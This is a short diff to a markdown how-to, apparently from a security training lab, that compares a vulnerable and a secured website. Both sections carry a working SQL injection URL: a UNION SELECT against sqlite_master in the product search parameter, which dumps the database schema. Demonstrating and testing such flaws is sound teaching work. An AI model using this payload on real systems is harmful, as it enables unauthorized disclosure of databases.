@@ -2,7 +2,7 @@
 ## How To (Vulnerable Website)
 1. Go to vulnerable website
 
-2. Update the path in the location bar from `{websiteURL}/#/search` to
+2. Update the path in the location bar from `{websiteURL}/#/` to
    `{websiteURL}/rest/products/search?q=')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`
 
 3. Verify that it returns the entire DB schema and data in the browser
@@ -19,7 +19,7 @@
 ## How To (Secured Website)
 1. Go to secured website
 
-2. Update the path in the location bar from `{websiteURL}/#/search` to
+2. Update the path in the location bar from `{websiteURL}/#/` to
    `{websiteURL}/rest/products/search?q=')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--`
 
 3. It does not return any data
